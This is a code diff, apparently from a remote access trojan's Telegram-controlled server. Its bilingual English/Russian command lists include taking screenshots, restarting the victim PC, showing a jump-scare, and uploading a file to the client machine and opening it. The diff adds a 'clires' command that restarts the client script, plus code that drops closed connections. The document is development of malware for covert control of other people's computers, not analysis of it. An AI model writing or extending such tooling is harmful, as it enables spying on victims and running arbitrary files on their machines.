@@ -12,6 +12,7 @@ commands_en = [
     ["restart", "Restarts the client PC"],
     ["screen", "makes screenshot"],
     ["drop", "uploads file to client pc and opep it"],
+    ["clires", "restarts client script"],
 ]
 
 commands = [
@@ -26,6 +27,7 @@ commands = [
     ["screen", "делает скриншот"],
     ["screamer", "показывает скример"],
     ["drop", "отправляет файл из телеграма и открывает его на клиенте"],
+    ["clires", "перезапускает скрипт клиента"],
 ]
 
 # выводит список доступных команд
@@ -109,6 +111,9 @@ class ManyServers:
         else:
             command = command.split()[1:]
             res = self.__servers_ips[tag][1].step(command)
+            if res == "соединение закрыто":
+                self.__servers_ips.pop(tag)
+                self.__servers_count.pop(int(tag))
             return res
 
 
@@ -142,6 +147,8 @@ class Server:
                 result = self.__screenshot(result)
             elif command[0] == "ratHelp":
                 result = help_command()
+            elif command[0] == "clires":
+                return "соединение закрыто"
         except Exception:
             result = "[-] Error running command, check the syntax of the command."
         return result
